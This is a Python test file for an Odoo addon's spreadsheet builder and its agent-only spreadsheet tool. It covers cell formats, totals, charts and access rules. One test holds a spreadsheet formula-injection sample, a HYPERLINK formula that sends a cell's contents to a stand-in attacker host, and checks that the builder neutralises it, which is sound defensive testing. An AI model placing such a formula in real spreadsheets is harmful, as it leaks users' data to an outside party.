import json

from odoo.exceptions import AccessError
from odoo.tests import TransactionCase, tagged

from odoo.addons.nudge import tools
from odoo.addons.nudge.tests.common import NudgeCase

from ..tools import workbook

SHEET = {
    "name": "Salaries",
    "columns": [
        {"label": "Department", "type": "text"},
        {"label": "September", "type": "money"},
        {"label": "October", "type": "money"},
        {"label": "Change", "type": "percent"},
    ],
    "rows": [
        ["Site", 120000, 125500.5, 0.046],
        ["Office", 48000, 48000, 0],
        ["Drivers", 15250, None, -1],
    ],
    "totals": True,
    "chart": {"type": "bar", "title": "By department", "label_column": 0, "data_columns": [1, 2]},
}


@tagged("post_install", "-at_install")
class TestWorkbook(TransactionCase):

    def test_the_table_its_totals_and_its_chart(self):
        empty = self.env["nudge.spreadsheet"]._empty_spreadsheet_data()
        data = workbook.build_workbook(empty, [SHEET])
        self.assertEqual(data.get("version"), empty.get("version"), "What the empty workbook carries is kept")
        sheet = data["sheets"][0]
        self.assertEqual(sheet["name"], "Salaries")
        cells = sheet["cells"]
        self.assertEqual(cells["A1"], "Department")
        self.assertEqual(sheet["styles"]["A1"], workbook.HEADER_STYLE)
        self.assertEqual(cells["B2"], "120000")
        self.assertEqual(cells["C2"], "125500.5")
        self.assertNotIn("C4", cells, "An empty value is an empty cell")
        self.assertEqual(cells["B5"], "=SUM(B2:B4)")
        self.assertEqual(cells["A5"], "Total")
        self.assertEqual(sheet["styles"]["B5"], workbook.TOTAL_STYLE)
        money = sheet["formats"]["B2"]
        self.assertEqual(data["formats"][money], "#,##0.00")
        self.assertEqual(data["formats"][sheet["formats"]["D2"]], "0.0%")
        figure = sheet["figures"][0]
        self.assertEqual(figure["tag"], "chart")
        self.assertEqual(figure["data"]["type"], "bar")
        self.assertEqual(figure["data"]["labelRange"], "A2:A4")
        self.assertEqual([d["dataRange"] for d in figure["data"]["dataSets"]], ["B1:B4", "C1:C4"])
        self.assertTrue(figure["data"]["dataSetsHaveTitle"])
        self.assertEqual(figure["col"], 5)
        self.assertEqual(sheet["tables"][0]["range"], "A1:D4")
        # What the spreadsheet module checks on save
        self.env["nudge.spreadsheet"].create({"name": "t", "spreadsheet_data": json.dumps(data)})

    def test_a_count_has_no_dot(self):
        empty = self.env["nudge.spreadsheet"]._empty_spreadsheet_data()
        data = workbook.build_workbook(empty, [{
            "name": "Sales by customer",
            "columns": [{"label": "Customer", "type": "text"}, {"label": "Orders", "type": "number"},
                        {"label": "Average", "type": "number"}],
            "rows": [["Acme", 3, 12.5], ["Gemini", 17, "4"], ["Deco", None, 7]],
            "totals": True,
        }])
        sheet = data["sheets"][0]
        self.assertEqual(data["formats"][sheet["formats"]["B2"]], "#,##0", "3 orders, not 3.")
        self.assertEqual(data["formats"][sheet["formats"]["B5"]], "#,##0", "Their total too")
        self.assertEqual(data["formats"][sheet["formats"]["C3"]], "#,##0.##", "A column with decimals keeps them")

    def test_letters_and_values(self):
        self.assertEqual([workbook.column_letter(i) for i in (0, 25, 26, 27, 701, 702)],
                         ["A", "Z", "AA", "AB", "ZZ", "AAA"])
        self.assertEqual(workbook._cell_content("1,250.5", "money"), "1250.5")
        self.assertEqual(workbook._cell_content("n/a", "number"), "n/a")
        self.assertEqual(workbook._cell_content(True, "number"), "1")
        self.assertEqual(workbook._cell_content("2026-09-01", "date"), "2026-09-01")
        self.assertIsNone(workbook._cell_content("", "text"))

    def test_a_chart_without_columns_takes_the_numbers(self):
        spec = dict(SHEET, chart={"type": "pie"})
        sheet = workbook.build_sheet(spec, 1, {"money": "1", "percent": "2", "number": "3", "date": "4"})
        figure = sheet["figures"][0]
        self.assertEqual([d["dataRange"] for d in figure["data"]["dataSets"]], ["B1:B4", "C1:C4", "D1:D4"])
        self.assertEqual(figure["data"]["type"], "pie")
        no_rows = workbook.build_sheet(dict(SHEET, rows=[], chart={"type": "bar"}), 1, {})
        self.assertEqual(no_rows["figures"], [])
        self.assertEqual(no_rows["tables"], [])


@tagged("post_install", "-at_install")
class TestTool(NudgeCase, TransactionCase):

    def test_the_spreadsheet_is_made_and_opened(self):
        result = tools.base.call(self.env(user=self.agent), "make_spreadsheet", {
            "title": " Salaries: September vs October ",
            "sheets": [SHEET],
            "text": "Here is the comparison.",
        }, None, "agent")
        self.assertFalse(result.is_error, result.content)
        event = result.event
        self.assertEqual(event["type"], "open_action")
        self.assertEqual(event["action"]["tag"], "nudge_spreadsheet.open")
        self.assertEqual(event["text"], "Here is the comparison.")
        spreadsheet = self.env["nudge.spreadsheet"].browse(event["action"]["params"]["spreadsheet_id"])
        self.assertEqual(spreadsheet.name, "Salaries: September vs October")
        self.assertEqual(spreadsheet.user_id, self.agent)
        data = json.loads(spreadsheet.spreadsheet_data)
        self.assertEqual(data["sheets"][0]["cells"]["B2"], "120000")
        self.assertIn("3 rows", result.content)
        self.assertTrue(tools.base.TOOLS["make_spreadsheet"].terminal)

        # The model gave no chart: one is drawn, of the amounts, for the person chose it
        bare = {key: value for key, value in SHEET.items() if key != "chart"}
        result = tools.base.call(self.env(user=self.agent), "make_spreadsheet", {
            "title": "No chart given", "sheets": [bare, dict(bare, name="One row", rows=SHEET["rows"][:1])],
            "text": "Here.",
        }, None, "agent")
        drawn = json.loads(self.env["nudge.spreadsheet"].browse(
            result.event["action"]["params"]["spreadsheet_id"]).spreadsheet_data)["sheets"]
        self.assertEqual([d["dataRange"] for d in drawn[0]["figures"][0]["data"]["dataSets"]], ["B1:B4", "C1:C4"])
        self.assertEqual(drawn[0]["figures"][0]["data"]["type"], "bar")
        self.assertEqual(drawn[1]["figures"], [], "One row is no chart")

        # Theirs: another person does not see it
        with self.assertRaises(AccessError):
            spreadsheet.with_user(self.user_a).read(["name"])
        with self.assertRaises(AccessError):
            spreadsheet.with_user(self.agent).write({"user_id": self.user_a.id})
        served = spreadsheet.with_user(self.agent).get_spreadsheet(spreadsheet.id)
        self.assertEqual(served["name"], spreadsheet.name)
        self.assertTrue(served["can_write"])
        spreadsheet.with_user(self.agent).save_spreadsheet(json.dumps(dict(data, revisionId="x")))
        self.assertEqual(json.loads(spreadsheet.spreadsheet_data)["revisionId"], "x")

    def test_agent_only(self):
        for mode, user in (("talk", self.agent), ("agent", self.user_a)):
            names = [tool.name for tool in tools.base.available(self.env(user=user), mode)]
            self.assertNotIn("make_spreadsheet", names)
        self.assertIn("make_spreadsheet",
                      [tool.name for tool in tools.base.available(self.env(user=self.agent), "agent")])

    def test_a_text_that_starts_like_a_formula_stays_a_text(self):
        evil = '=HYPERLINK("https://evil.example/?"&B2,"Open")'
        for value in (evil, "+1 call", "-cmd", "@SUM(A1)", "  =1+1"):
            content = workbook._cell_content(value, "text")
            self.assertFalse(content.lstrip().startswith(("=", "+", "-", "@")) and not content.startswith(" "), value)
            self.assertTrue(content.startswith(" "), value)
        self.assertEqual(workbook._cell_content("-1,250.5", "money"), "-1250.5", "A number is still a number")
        self.assertEqual(workbook._cell_content("=SUM(A1)", "number"), " =SUM(A1)", "A number column too")
        self.assertEqual(workbook._cell_content("Acme", "text"), "Acme")
        empty = self.env["nudge.spreadsheet"]._empty_spreadsheet_data()
        data = workbook.build_workbook(empty, [{
            "name": "Contacts", "columns": [{"label": "=Name", "type": "text"}], "rows": [[evil]], "totals": False}])
        cells = data["sheets"][0]["cells"]
        self.assertTrue(cells["A1"].startswith(" ") and cells["A2"].startswith(" "))
